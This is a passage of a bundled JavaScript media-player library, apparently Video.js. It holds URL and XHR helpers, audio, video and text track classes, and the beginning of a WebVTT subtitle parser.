 *         Absolute URL
 *
 * @see http://stackoverflow.com/questions/470832/getting-an-absolute-url-from-a-relative-one-ie6-issue
 */
var getAbsoluteURL = function getAbsoluteURL(url) {
  // Check if absolute URL
  if (!url.match(/^https?:\/\//)) {
    // Convert to absolute URL. Flash hosted off-site needs an absolute URL.
    var div = document_1.createElement('div');

    div.innerHTML = '<a href="' + url + '">x</a>';
    url = div.firstChild.href;
  }

  return url;
};

/**
 * Returns the extension of the passed file name. It will return an empty string
 * if passed an invalid path.
 *
 * @param {string} path
 *        The fileName path like '/path/to/file.mp4'
 *
 * @returns {string}
 *          The extension in lower case or an empty string if no
 *          extension could be found.
 */
var getFileExtension = function getFileExtension(path) {
  if (typeof path === 'string') {
    var splitPathRe = /^(\/?)([\s\S]*?)((?:\.{1,2}|[^\/]+?)(\.([^\.\/\?]+)))(?:[\/]*|[\?].*)$/i;
    var pathParts = splitPathRe.exec(path);

    if (pathParts) {
      return pathParts.pop().toLowerCase();
    }
  }

  return '';
};

/**
 * Returns whether the url passed is a cross domain request or not.
 *
 * @param {string} url
 *        The url to check.
 *
 * @return {boolean}
 *         Whether it is a cross domain request or not.
 */
var isCrossOrigin = function isCrossOrigin(url) {
  var winLoc = window_1.location;
  var urlInfo = parseUrl(url);

  // IE8 protocol relative urls will return ':' for protocol
  var srcProtocol = urlInfo.protocol === ':' ? winLoc.protocol : urlInfo.protocol;

  // Check if url is for another domain/origin
  // IE8 doesn't know location.origin, so we won't rely on it here
  var crossOrigin = srcProtocol + urlInfo.host !== winLoc.protocol + winLoc.host;

  return crossOrigin;
};

var Url = (Object.freeze || Object)({
	parseUrl: parseUrl,
	getAbsoluteURL: getAbsoluteURL,
	getFileExtension: getFileExtension,
	isCrossOrigin: isCrossOrigin
});

var isFunction_1 = isFunction;

var toString$1 = Object.prototype.toString;

function isFunction (fn) {
  var string = toString$1.call(fn);
  return string === '[object Function]' ||
    (typeof fn === 'function' && string !== '[object RegExp]') ||
    (typeof window !== 'undefined' &&
     // IE8 and below
     (fn === window.setTimeout ||
      fn === window.alert ||
      fn === window.confirm ||
      fn === window.prompt))
}

var trim_1 = createCommonjsModule(function (module, exports) {
exports = module.exports = trim;

function trim(str){
  return str.replace(/^\s*|\s*$/g, '');
}

exports.left = function(str){
  return str.replace(/^\s*/, '');
};

exports.right = function(str){
  return str.replace(/\s*$/, '');
};
});

var forEach_1 = forEach;

var toString$2 = Object.prototype.toString;
var hasOwnProperty = Object.prototype.hasOwnProperty;

function forEach(list, iterator, context) {
    if (!isFunction_1(iterator)) {
        throw new TypeError('iterator must be a function')
    }

    if (arguments.length < 3) {
        context = this;
    }
    
    if (toString$2.call(list) === '[object Array]')
        forEachArray$1(list, iterator, context);
    else if (typeof list === 'string')
        forEachString(list, iterator, context);
    else
        forEachObject(list, iterator, context);
}

function forEachArray$1(array, iterator, context) {
    for (var i = 0, len = array.length; i < len; i++) {
        if (hasOwnProperty.call(array, i)) {
            iterator.call(context, array[i], i, array);
        }
    }
}

function forEachString(string, iterator, context) {
    for (var i = 0, len = string.length; i < len; i++) {
        // no such thing as a sparse string.
        iterator.call(context, string.charAt(i), i, string);
    }
}

function forEachObject(object, iterator, context) {
    for (var k in object) {
        if (hasOwnProperty.call(object, k)) {
            iterator.call(context, object[k], k, object);
        }
    }
}

var isArray = function(arg) {
      return Object.prototype.toString.call(arg) === '[object Array]';
    };

var parseHeaders = function (headers) {
  if (!headers)
    return {}

  var result = {};

  forEach_1(
      trim_1(headers).split('\n')
    , function (row) {
        var index = row.indexOf(':')
          , key = trim_1(row.slice(0, index)).toLowerCase()
          , value = trim_1(row.slice(index + 1));

        if (typeof(result[key]) === 'undefined') {
          result[key] = value;
        } else if (isArray(result[key])) {
          result[key].push(value);
        } else {
          result[key] = [ result[key], value ];
        }
      }
  );

  return result
};

var immutable = extend;

var hasOwnProperty$1 = Object.prototype.hasOwnProperty;

function extend() {
    var target = {};

    for (var i = 0; i < arguments.length; i++) {
        var source = arguments[i];

        for (var key in source) {
            if (hasOwnProperty$1.call(source, key)) {
                target[key] = source[key];
            }
        }
    }

    return target
}

var xhr = createXHR;
createXHR.XMLHttpRequest = window_1.XMLHttpRequest || noop;
createXHR.XDomainRequest = "withCredentials" in (new createXHR.XMLHttpRequest()) ? createXHR.XMLHttpRequest : window_1.XDomainRequest;

forEachArray(["get", "put", "post", "patch", "head", "delete"], function(method) {
    createXHR[method === "delete" ? "del" : method] = function(uri, options, callback) {
        options = initParams(uri, options, callback);
        options.method = method.toUpperCase();
        return _createXHR(options)
    };
});

function forEachArray(array, iterator) {
    for (var i = 0; i < array.length; i++) {
        iterator(array[i]);
    }
}

function isEmpty(obj){
    for(var i in obj){
        if(obj.hasOwnProperty(i)) return false
    }
    return true
}

function initParams(uri, options, callback) {
    var params = uri;

    if (isFunction_1(options)) {
        callback = options;
        if (typeof uri === "string") {
            params = {uri:uri};
        }
    } else {
        params = immutable(options, {uri: uri});
    }

    params.callback = callback;
    return params
}

function createXHR(uri, options, callback) {
    options = initParams(uri, options, callback);
    return _createXHR(options)
}

function _createXHR(options) {
    if(typeof options.callback === "undefined"){
        throw new Error("callback argument missing")
    }

    var called = false;
    var callback = function cbOnce(err, response, body){
        if(!called){
            called = true;
            options.callback(err, response, body);
        }
    };

    function readystatechange() {
        if (xhr.readyState === 4) {
            setTimeout(loadFunc, 0);
        }
    }

    function getBody() {
        // Chrome with requestType=blob throws errors arround when even testing access to responseText
        var body = undefined;

        if (xhr.response) {
            body = xhr.response;
        } else {
            body = xhr.responseText || getXml(xhr);
        }

        if (isJson) {
            try {
                body = JSON.parse(body);
            } catch (e) {}
        }

        return body
    }

    function errorFunc(evt) {
        clearTimeout(timeoutTimer);
        if(!(evt instanceof Error)){
            evt = new Error("" + (evt || "Unknown XMLHttpRequest Error") );
        }
        evt.statusCode = 0;
        return callback(evt, failureResponse)
    }

    // will load the data & process the response in a special response object
    function loadFunc() {
        if (aborted) return
        var status;
        clearTimeout(timeoutTimer);
        if(options.useXDR && xhr.status===undefined) {
            //IE8 CORS GET successful response doesn't have a status field, but body is fine
            status = 200;
        } else {
            status = (xhr.status === 1223 ? 204 : xhr.status);
        }
        var response = failureResponse;
        var err = null;

        if (status !== 0){
            response = {
                body: getBody(),
                statusCode: status,
                method: method,
                headers: {},
                url: uri,
                rawRequest: xhr
            };
            if(xhr.getAllResponseHeaders){ //remember xhr can in fact be XDR for CORS in IE
                response.headers = parseHeaders(xhr.getAllResponseHeaders());
            }
        } else {
            err = new Error("Internal XMLHttpRequest Error");
        }
        return callback(err, response, response.body)
    }

    var xhr = options.xhr || null;

    if (!xhr) {
        if (options.cors || options.useXDR) {
            xhr = new createXHR.XDomainRequest();
        }else{
            xhr = new createXHR.XMLHttpRequest();
        }
    }

    var key;
    var aborted;
    var uri = xhr.url = options.uri || options.url;
    var method = xhr.method = options.method || "GET";
    var body = options.body || options.data;
    var headers = xhr.headers = options.headers || {};
    var sync = !!options.sync;
    var isJson = false;
    var timeoutTimer;
    var failureResponse = {
        body: undefined,
        headers: {},
        statusCode: 0,
        method: method,
        url: uri,
        rawRequest: xhr
    };

    if ("json" in options && options.json !== false) {
        isJson = true;
        headers["accept"] || headers["Accept"] || (headers["Accept"] = "application/json"); //Don't override existing accept header declared by user
        if (method !== "GET" && method !== "HEAD") {
            headers["content-type"] || headers["Content-Type"] || (headers["Content-Type"] = "application/json"); //Don't override existing accept header declared by user
            body = JSON.stringify(options.json === true ? body : options.json);
        }
    }

    xhr.onreadystatechange = readystatechange;
    xhr.onload = loadFunc;
    xhr.onerror = errorFunc;
    // IE9 must have onprogress be set to a unique function.
    xhr.onprogress = function () {
        // IE must die
    };
    xhr.onabort = function(){
        aborted = true;
    };
    xhr.ontimeout = errorFunc;
    xhr.open(method, uri, !sync, options.username, options.password);
    //has to be after open
    if(!sync) {
        xhr.withCredentials = !!options.withCredentials;
    }
    // Cannot set timeout with sync request
    // not setting timeout on the xhr object, because of old webkits etc. not handling that correctly
    // both npm's request and jquery 1.x use this kind of timeout, so this is being consistent
    if (!sync && options.timeout > 0 ) {
        timeoutTimer = setTimeout(function(){
            if (aborted) return
            aborted = true;//IE9 may still call readystatechange
            xhr.abort("timeout");
            var e = new Error("XMLHttpRequest timeout");
            e.code = "ETIMEDOUT";
            errorFunc(e);
        }, options.timeout );
    }

    if (xhr.setRequestHeader) {
        for(key in headers){
            if(headers.hasOwnProperty(key)){
                xhr.setRequestHeader(key, headers[key]);
            }
        }
    } else if (options.headers && !isEmpty(options.headers)) {
        throw new Error("Headers cannot be set on an XDomainRequest object")
    }

    if ("responseType" in options) {
        xhr.responseType = options.responseType;
    }

    if ("beforeSend" in options &&
        typeof options.beforeSend === "function"
    ) {
        options.beforeSend(xhr);
    }

    // Microsoft Edge browser sends "undefined" when send is called with undefined value.
    // XMLHttpRequest spec says to pass null as body to indicate no body
    // See https://github.com/naugtur/xhr/issues/100.
    xhr.send(body || null);

    return xhr


}

function getXml(xhr) {
    if (xhr.responseType === "document") {
        return xhr.responseXML
    }
    var firefoxBugTakenEffect = xhr.responseXML && xhr.responseXML.documentElement.nodeName === "parsererror";
    if (xhr.responseType === "" && !firefoxBugTakenEffect) {
        return xhr.responseXML
    }

    return null
}

function noop() {}

/**
 * @file text-track.js
 */
/**
 * Takes a webvtt file contents and parses it into cues
 *
 * @param {string} srcContent
 *        webVTT file contents
 *
 * @param {TextTrack} track
 *        TextTrack to add cues to. Cues come from the srcContent.
 *
 * @private
 */
var parseCues = function parseCues(srcContent, track) {
  var parser = new window_1.WebVTT.Parser(window_1, window_1.vttjs, window_1.WebVTT.StringDecoder());
  var errors = [];

  parser.oncue = function (cue) {
    track.addCue(cue);
  };

  parser.onparsingerror = function (error) {
    errors.push(error);
  };

  parser.onflush = function () {
    track.trigger({
      type: 'loadeddata',
      target: track
    });
  };

  parser.parse(srcContent);
  if (errors.length > 0) {
    if (window_1.console && window_1.console.groupCollapsed) {
      window_1.console.groupCollapsed('Text Track parsing errors for ' + track.src);
    }
    errors.forEach(function (error) {
      return log$1.error(error);
    });
    if (window_1.console && window_1.console.groupEnd) {
      window_1.console.groupEnd();
    }
  }

  parser.flush();
};

/**
 * Load a `TextTrack` from a specifed url.
 *
 * @param {string} src
 *        Url to load track from.
 *
 * @param {TextTrack} track
 *        Track to add cues to. Comes from the content at the end of `url`.
 *
 * @private
 */
var loadTrack = function loadTrack(src, track) {
  var opts = {
    uri: src
  };
  var crossOrigin = isCrossOrigin(src);

  if (crossOrigin) {
    opts.cors = crossOrigin;
  }

  xhr(opts, bind(this, function (err, response, responseBody) {
    if (err) {
      return log$1.error(err, response);
    }

    track.loaded_ = true;

    // Make sure that vttjs has loaded, otherwise, wait till it finished loading
    // NOTE: this is only used for the alt/video.novtt.js build
    if (typeof window_1.WebVTT !== 'function') {
      if (track.tech_) {
        var loadHandler = function loadHandler() {
          return parseCues(responseBody, track);
        };

        track.tech_.on('vttjsloaded', loadHandler);
        track.tech_.on('vttjserror', function () {
          log$1.error('vttjs failed to load, stopping trying to process ' + track.src);
          track.tech_.off('vttjsloaded', loadHandler);
        });
      }
    } else {
      parseCues(responseBody, track);
    }
  }));
};

/**
 * A representation of a single `TextTrack`.
 *
 * @see [Spec]{@link https://html.spec.whatwg.org/multipage/embedded-content.html#texttrack}
 * @extends Track
 */

var TextTrack = function (_Track) {
  inherits(TextTrack, _Track);

  /**
   * Create an instance of this class.
   *
   * @param {Object} options={}
   *        Object of option names and values
   *
   * @param {Tech} options.tech
   *        A reference to the tech that owns this TextTrack.
   *
   * @param {TextTrack~Kind} [options.kind='subtitles']
   *        A valid text track kind.
   *
   * @param {TextTrack~Mode} [options.mode='disabled']
   *        A valid text track mode.
   *
   * @param {string} [options.id='vjs_track_' + Guid.newGUID()]
   *        A unique id for this TextTrack.
   *
   * @param {string} [options.label='']
   *        The menu label for this track.
   *
   * @param {string} [options.language='']
   *        A valid two character language code.
   *
   * @param {string} [options.srclang='']
   *        A valid two character language code. An alternative, but deprioritized
   *        vesion of `options.language`
   *
   * @param {string} [options.src]
   *        A url to TextTrack cues.
   *
   * @param {boolean} [options.default]
   *        If this track should default to on or off.
   */
  function TextTrack() {
    var _this, _ret;

    var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
    classCallCheck(this, TextTrack);

    if (!options.tech) {
      throw new Error('A tech was not provided.');
    }

    var settings = mergeOptions(options, {
      kind: TextTrackKind[options.kind] || 'subtitles',
      language: options.language || options.srclang || ''
    });
    var mode = TextTrackMode[settings.mode] || 'disabled';
    var default_ = settings['default'];

    if (settings.kind === 'metadata' || settings.kind === 'chapters') {
      mode = 'hidden';
    }
    // on IE8 this will be a document element
    // for every other browser this will be a normal object
    var tt = (_this = possibleConstructorReturn(this, _Track.call(this, settings)), _this);

    tt.tech_ = settings.tech;

    if (IS_IE8) {
      for (var prop in TextTrack.prototype) {
        if (prop !== 'constructor') {
          tt[prop] = TextTrack.prototype[prop];
        }
      }
    }

    tt.cues_ = [];
    tt.activeCues_ = [];

    var cues = new TextTrackCueList(tt.cues_);
    var activeCues = new TextTrackCueList(tt.activeCues_);
    var changed = false;
    var timeupdateHandler = bind(tt, function () {

      // Accessing this.activeCues for the side-effects of updating itself
      // due to it's nature as a getter function. Do not remove or cues will
      // stop updating!
      /* eslint-disable no-unused-expressions */
      this.activeCues;
      /* eslint-enable no-unused-expressions */
      if (changed) {
        this.trigger('cuechange');
        changed = false;
      }
    });

    if (mode !== 'disabled') {
      tt.tech_.ready(function () {
        tt.tech_.on('timeupdate', timeupdateHandler);
      }, true);
    }

    /**
     * @memberof TextTrack
     * @member {boolean} default
     *         If this track was set to be on or off by default. Cannot be changed after
     *         creation.
     * @instance
     *
     * @readonly
     */
    Object.defineProperty(tt, 'default', {
      get: function get$$1() {
        return default_;
      },
      set: function set$$1() {}
    });

    /**
     * @memberof TextTrack
     * @member {string} mode
     *         Set the mode of this TextTrack to a valid {@link TextTrack~Mode}. Will
     *         not be set if setting to an invalid mode.
     * @instance
     *
     * @fires TextTrack#modechange
     */
    Object.defineProperty(tt, 'mode', {
      get: function get$$1() {
        return mode;
      },
      set: function set$$1(newMode) {
        var _this2 = this;

        if (!TextTrackMode[newMode]) {
          return;
        }
        mode = newMode;
        if (mode === 'showing') {

          this.tech_.ready(function () {
            _this2.tech_.on('timeupdate', timeupdateHandler);
          }, true);
        }
        /**
         * An event that fires when mode changes on this track. This allows
         * the TextTrackList that holds this track to act accordingly.
         *
         * > Note: This is not part of the spec!
         *
         * @event TextTrack#modechange
         * @type {EventTarget~Event}
         */
        this.trigger('modechange');
      }
    });

    /**
     * @memberof TextTrack
     * @member {TextTrackCueList} cues
     *         The text track cue list for this TextTrack.
     * @instance
     */
    Object.defineProperty(tt, 'cues', {
      get: function get$$1() {
        if (!this.loaded_) {
          return null;
        }

        return cues;
      },
      set: function set$$1() {}
    });

    /**
     * @memberof TextTrack
     * @member {TextTrackCueList} activeCues
     *         The list text track cues that are currently active for this TextTrack.
     * @instance
     */
    Object.defineProperty(tt, 'activeCues', {
      get: function get$$1() {
        if (!this.loaded_) {
          return null;
        }

        // nothing to do
        if (this.cues.length === 0) {
          return activeCues;
        }

        var ct = this.tech_.currentTime();
        var active = [];

        for (var i = 0, l = this.cues.length; i < l; i++) {
          var cue = this.cues[i];

          if (cue.startTime <= ct && cue.endTime >= ct) {
            active.push(cue);
          } else if (cue.startTime === cue.endTime && cue.startTime <= ct && cue.startTime + 0.5 >= ct) {
            active.push(cue);
          }
        }

        changed = false;

        if (active.length !== this.activeCues_.length) {
          changed = true;
        } else {
          for (var _i = 0; _i < active.length; _i++) {
            if (this.activeCues_.indexOf(active[_i]) === -1) {
              changed = true;
            }
          }
        }

        this.activeCues_ = active;
        activeCues.setCues_(this.activeCues_);

        return activeCues;
      },
      set: function set$$1() {}
    });

    if (settings.src) {
      tt.src = settings.src;
      loadTrack(settings.src, tt);
    } else {
      tt.loaded_ = true;
    }

    return _ret = tt, possibleConstructorReturn(_this, _ret);
  }

  /**
   * Add a cue to the internal list of cues.
   *
   * @param {TextTrack~Cue} cue
   *        The cue to add to our internal list
   */


  TextTrack.prototype.addCue = function addCue(originalCue) {
    var cue = originalCue;

    if (window_1.vttjs && !(originalCue instanceof window_1.vttjs.VTTCue)) {
      cue = new window_1.vttjs.VTTCue(originalCue.startTime, originalCue.endTime, originalCue.text);

      for (var prop in originalCue) {
        if (!(prop in cue)) {
          cue[prop] = originalCue[prop];
        }
      }

      // make sure that `id` is copied over
      cue.id = originalCue.id;
      cue.originalCue_ = originalCue;
    }

    var tracks = this.tech_.textTracks();

    for (var i = 0; i < tracks.length; i++) {
      if (tracks[i] !== this) {
        tracks[i].removeCue(cue);
      }
    }

    this.cues_.push(cue);
    this.cues.setCues_(this.cues_);
  };

  /**
   * Remove a cue from our internal list
   *
   * @param {TextTrack~Cue} removeCue
   *        The cue to remove from our internal list
   */


  TextTrack.prototype.removeCue = function removeCue(_removeCue) {
    var i = this.cues_.length;

    while (i--) {
      var cue = this.cues_[i];

      if (cue === _removeCue || cue.originalCue_ && cue.originalCue_ === _removeCue) {
        this.cues_.splice(i, 1);
        this.cues.setCues_(this.cues_);
        break;
      }
    }
  };

  return TextTrack;
}(Track);

/**
 * cuechange - One or more cues in the track have become active or stopped being active.
 */


TextTrack.prototype.allowedEvents_ = {
  cuechange: 'cuechange'
};

/**
 * A representation of a single `AudioTrack`. If it is part of an {@link AudioTrackList}
 * only one `AudioTrack` in the list will be enabled at a time.
 *
 * @see [Spec]{@link https://html.spec.whatwg.org/multipage/embedded-content.html#audiotrack}
 * @extends Track
 */

var AudioTrack = function (_Track) {
  inherits(AudioTrack, _Track);

  /**
   * Create an instance of this class.
   *
   * @param {Object} [options={}]
   *        Object of option names and values
   *
   * @param {AudioTrack~Kind} [options.kind='']
   *        A valid audio track kind
   *
   * @param {string} [options.id='vjs_track_' + Guid.newGUID()]
   *        A unique id for this AudioTrack.
   *
   * @param {string} [options.label='']
   *        The menu label for this track.
   *
   * @param {string} [options.language='']
   *        A valid two character language code.
   *
   * @param {boolean} [options.enabled]
   *        If this track is the one that is currently playing. If this track is part of
   *        an {@link AudioTrackList}, only one {@link AudioTrack} will be enabled.
   */
  function AudioTrack() {
    var _this, _ret;

    var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
    classCallCheck(this, AudioTrack);

    var settings = mergeOptions(options, {
      kind: AudioTrackKind[options.kind] || ''
    });
    // on IE8 this will be a document element
    // for every other browser this will be a normal object
    var track = (_this = possibleConstructorReturn(this, _Track.call(this, settings)), _this);
    var enabled = false;

    if (IS_IE8) {
      for (var prop in AudioTrack.prototype) {
        if (prop !== 'constructor') {
          track[prop] = AudioTrack.prototype[prop];
        }
      }
    }
    /**
     * @memberof AudioTrack
     * @member {boolean} enabled
     *         If this `AudioTrack` is enabled or not. When setting this will
     *         fire {@link AudioTrack#enabledchange} if the state of enabled is changed.
     * @instance
     *
     * @fires VideoTrack#selectedchange
     */
    Object.defineProperty(track, 'enabled', {
      get: function get$$1() {
        return enabled;
      },
      set: function set$$1(newEnabled) {
        // an invalid or unchanged value
        if (typeof newEnabled !== 'boolean' || newEnabled === enabled) {
          return;
        }
        enabled = newEnabled;

        /**
         * An event that fires when enabled changes on this track. This allows
         * the AudioTrackList that holds this track to act accordingly.
         *
         * > Note: This is not part of the spec! Native tracks will do
         *         this internally without an event.
         *
         * @event AudioTrack#enabledchange
         * @type {EventTarget~Event}
         */
        this.trigger('enabledchange');
      }
    });

    // if the user sets this track to selected then
    // set selected to that true value otherwise
    // we keep it false
    if (settings.enabled) {
      track.enabled = settings.enabled;
    }
    track.loaded_ = true;

    return _ret = track, possibleConstructorReturn(_this, _ret);
  }

  return AudioTrack;
}(Track);

/**
 * A representation of a single `VideoTrack`.
 *
 * @see [Spec]{@link https://html.spec.whatwg.org/multipage/embedded-content.html#videotrack}
 * @extends Track
 */

var VideoTrack = function (_Track) {
  inherits(VideoTrack, _Track);

  /**
   * Create an instance of this class.
   *
   * @param {Object} [options={}]
   *        Object of option names and values
   *
   * @param {string} [options.kind='']
   *        A valid {@link VideoTrack~Kind}
   *
   * @param {string} [options.id='vjs_track_' + Guid.newGUID()]
   *        A unique id for this AudioTrack.
   *
   * @param {string} [options.label='']
   *        The menu label for this track.
   *
   * @param {string} [options.language='']
   *        A valid two character language code.
   *
   * @param {boolean} [options.selected]
   *        If this track is the one that is currently playing.
   */
  function VideoTrack() {
    var _this, _ret;

    var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
    classCallCheck(this, VideoTrack);

    var settings = mergeOptions(options, {
      kind: VideoTrackKind[options.kind] || ''
    });

    // on IE8 this will be a document element
    // for every other browser this will be a normal object
    var track = (_this = possibleConstructorReturn(this, _Track.call(this, settings)), _this);
    var selected = false;

    if (IS_IE8) {
      for (var prop in VideoTrack.prototype) {
        if (prop !== 'constructor') {
          track[prop] = VideoTrack.prototype[prop];
        }
      }
    }

    /**
     * @memberof VideoTrack
     * @member {boolean} selected
     *         If this `VideoTrack` is selected or not. When setting this will
     *         fire {@link VideoTrack#selectedchange} if the state of selected changed.
     * @instance
     *
     * @fires VideoTrack#selectedchange
     */
    Object.defineProperty(track, 'selected', {
      get: function get$$1() {
        return selected;
      },
      set: function set$$1(newSelected) {
        // an invalid or unchanged value
        if (typeof newSelected !== 'boolean' || newSelected === selected) {
          return;
        }
        selected = newSelected;

        /**
         * An event that fires when selected changes on this track. This allows
         * the VideoTrackList that holds this track to act accordingly.
         *
         * > Note: This is not part of the spec! Native tracks will do
         *         this internally without an event.
         *
         * @event VideoTrack#selectedchange
         * @type {EventTarget~Event}
         */
        this.trigger('selectedchange');
      }
    });

    // if the user sets this track to selected then
    // set selected to that true value otherwise
    // we keep it false
    if (settings.selected) {
      track.selected = settings.selected;
    }

    return _ret = track, possibleConstructorReturn(_this, _ret);
  }

  return VideoTrack;
}(Track);

/**
 * @file html-track-element.js
 */

/**
 * @memberof HTMLTrackElement
 * @typedef {HTMLTrackElement~ReadyState}
 * @enum {number}
 */
var NONE = 0;
var LOADING = 1;
var LOADED = 2;
var ERROR = 3;

/**
 * A single track represented in the DOM.
 *
 * @see [Spec]{@link https://html.spec.whatwg.org/multipage/embedded-content.html#htmltrackelement}
 * @extends EventTarget
 */

var HTMLTrackElement = function (_EventTarget) {
  inherits(HTMLTrackElement, _EventTarget);

  /**
   * Create an instance of this class.
   *
   * @param {Object} options={}
   *        Object of option names and values
   *
   * @param {Tech} options.tech
   *        A reference to the tech that owns this HTMLTrackElement.
   *
   * @param {TextTrack~Kind} [options.kind='subtitles']
   *        A valid text track kind.
   *
   * @param {TextTrack~Mode} [options.mode='disabled']
   *        A valid text track mode.
   *
   * @param {string} [options.id='vjs_track_' + Guid.newGUID()]
   *        A unique id for this TextTrack.
   *
   * @param {string} [options.label='']
   *        The menu label for this track.
   *
   * @param {string} [options.language='']
   *        A valid two character language code.
   *
   * @param {string} [options.srclang='']
   *        A valid two character language code. An alternative, but deprioritized
   *        vesion of `options.language`
   *
   * @param {string} [options.src]
   *        A url to TextTrack cues.
   *
   * @param {boolean} [options.default]
   *        If this track should default to on or off.
   */
  function HTMLTrackElement() {
    var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
    classCallCheck(this, HTMLTrackElement);

    var _this = possibleConstructorReturn(this, _EventTarget.call(this));

    var readyState = void 0;
    var trackElement = _this; // eslint-disable-line

    if (IS_IE8) {
      trackElement = document_1.createElement('custom');

      for (var prop in HTMLTrackElement.prototype) {
        if (prop !== 'constructor') {
          trackElement[prop] = HTMLTrackElement.prototype[prop];
        }
      }
    }

    var track = new TextTrack(options);

    trackElement.kind = track.kind;
    trackElement.src = track.src;
    trackElement.srclang = track.language;
    trackElement.label = track.label;
    trackElement['default'] = track['default'];

    /**
     * @memberof HTMLTrackElement
     * @member {HTMLTrackElement~ReadyState} readyState
     *         The current ready state of the track element.
     * @instance
     */
    Object.defineProperty(trackElement, 'readyState', {
      get: function get$$1() {
        return readyState;
      }
    });

    /**
     * @memberof HTMLTrackElement
     * @member {TextTrack} track
     *         The underlying TextTrack object.
     * @instance
     *
     */
    Object.defineProperty(trackElement, 'track', {
      get: function get$$1() {
        return track;
      }
    });

    readyState = NONE;

    /**
     * @listens TextTrack#loadeddata
     * @fires HTMLTrackElement#load
     */
    track.addEventListener('loadeddata', function () {
      readyState = LOADED;

      trackElement.trigger({
        type: 'load',
        target: trackElement
      });
    });

    if (IS_IE8) {
      var _ret;

      return _ret = trackElement, possibleConstructorReturn(_this, _ret);
    }
    return _this;
  }

  return HTMLTrackElement;
}(EventTarget);

HTMLTrackElement.prototype.allowedEvents_ = {
  load: 'load'
};

HTMLTrackElement.NONE = NONE;
HTMLTrackElement.LOADING = LOADING;
HTMLTrackElement.LOADED = LOADED;
HTMLTrackElement.ERROR = ERROR;

/*
 * This file contains all track properties that are used in
 * player.js, tech.js, html5.js and possibly other techs in the future.
 */

var NORMAL = {
  audio: {
    ListClass: AudioTrackList,
    TrackClass: AudioTrack,
    capitalName: 'Audio'
  },
  video: {
    ListClass: VideoTrackList,
    TrackClass: VideoTrack,
    capitalName: 'Video'
  },
  text: {
    ListClass: TextTrackList,
    TrackClass: TextTrack,
    capitalName: 'Text'
  }
};

Object.keys(NORMAL).forEach(function (type) {
  NORMAL[type].getterName = type + 'Tracks';
  NORMAL[type].privateName = type + 'Tracks_';
});

var REMOTE = {
  remoteText: {
    ListClass: TextTrackList,
    TrackClass: TextTrack,
    capitalName: 'RemoteText',
    getterName: 'remoteTextTracks',
    privateName: 'remoteTextTracks_'
  },
  remoteTextEl: {
    ListClass: HtmlTrackElementList,
    TrackClass: HTMLTrackElement,
    capitalName: 'RemoteTextTrackEls',
    getterName: 'remoteTextTrackEls',
    privateName: 'remoteTextTrackEls_'
  }
};

var ALL = mergeOptions(NORMAL, REMOTE);

REMOTE.names = Object.keys(REMOTE);
NORMAL.names = Object.keys(NORMAL);
ALL.names = [].concat(REMOTE.names).concat(NORMAL.names);

/**
 * Copyright 2013 vtt.js Contributors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/* -*- Mode: Java; tab-width: 2; indent-tabs-mode: nil; c-basic-offset: 2 -*- */
/* vim: set shiftwidth=2 tabstop=2 autoindent cindent expandtab: */
var _objCreate = Object.create || (function() {
  function F() {}
  return function(o) {
    if (arguments.length !== 1) {
      throw new Error('Object.create shim only accepts one parameter.');
    }
    F.prototype = o;
    return new F();
  };
})();

// Creates a new ParserError object from an errorData object. The errorData
// object should have default code and message properties. The default message
// property can be overriden by passing in a message parameter.
// See ParsingError.Errors below for acceptable errors.
function ParsingError(errorData, message) {
  this.name = "ParsingError";
  this.code = errorData.code;
  this.message = message || errorData.message;
}
ParsingError.prototype = _objCreate(Error.prototype);
ParsingError.prototype.constructor = ParsingError;

// ParsingError metadata for acceptable ParsingErrors.
ParsingError.Errors = {
  BadSignature: {
    code: 0,
    message: "Malformed WebVTT signature."
  },
  BadTimeStamp: {
    code: 1,
    message: "Malformed time stamp."
  }
};

// Try to parse input as a time stamp.
function parseTimeStamp(input) {

  function computeSeconds(h, m, s, f) {
    return (h | 0) * 3600 + (m | 0) * 60 + (s | 0) + (f | 0) / 1000;
  }

  var m = input.match(/^(\d+):(\d{2})(:\d{2})?\.(\d{3})/);
  if (!m) {
    return null;
  }

  if (m[3]) {
    // Timestamp takes the form of [hours]:[minutes]:[seconds].[milliseconds]
    return computeSeconds(m[1], m[2], m[3].replace(":", ""), m[4]);
  } else if (m[1] > 59) {
    // Timestamp takes the form of [hours]:[minutes].[milliseconds]
    // First position is hours as it's over 59.
    return computeSeconds(m[1], m[2], 0,  m[4]);
  } else {
    // Timestamp takes the form of [minutes]:[seconds].[milliseconds]
    return computeSeconds(0, m[1], m[2], m[4]);
  }
}

// A settings object holds key/value pairs and will ignore anything but the first
// assignment to a specific key.
function Settings() {
  this.values = _objCreate(null);
}

Settings.prototype = {
  // Only accept the first assignment to any key.
  set: function(k, v) {
    if (!this.get(k) && v !== "") {
      this.values[k] = v;
    }
  },
  // Return the value for a key, or a default value.
  // If 'defaultKey' is passed then 'dflt' is assumed to be an object with
  // a number of possible default values as properties where 'defaultKey' is
  // the key of the property that will be chosen; otherwise it's assumed to be
  // a single value.
  get: function(k, dflt, defaultKey) {
    if (defaultKey) {
      return this.has(k) ? this.values[k] : dflt[defaultKey];
    }
    return this.has(k) ? this.values[k] : dflt;
  },
  // Check whether we have a value for a key.
  has: function(k) {
    return k in this.values;
  },
  // Accept a setting if its one of the given alternatives.
  alt: function(k, v, a) {
    for (var n = 0; n < a.length; ++n) {
      if (v === a[n]) {
        this.set(k, v);
        break;
      }
    }
  },
  // Accept a setting if its a valid (signed) integer.
  integer: function(k, v) {
    if (/^-?\d+$/.test(v)) { // integer
      this.set(k, parseInt(v, 10));
    }
  },
  // Accept a setting if its a valid percentage.
  percent: function(k, v) {
    var m;
    if ((m = v.match(/^([\d]{1,3})(\.[\d]*)?%$/))) {
      v = parseFloat(v);
      if (v >= 0 && v <= 100) {
        this.set(k, v);
        return true;
      }
    }
    return false;
  }
};

// Helper function to parse input into groups separated by 'groupDelim', and
// interprete each group as a key/value pair separated by 'keyValueDelim'.
function parseOptions(input, callback, keyValueDelim, groupDelim) {
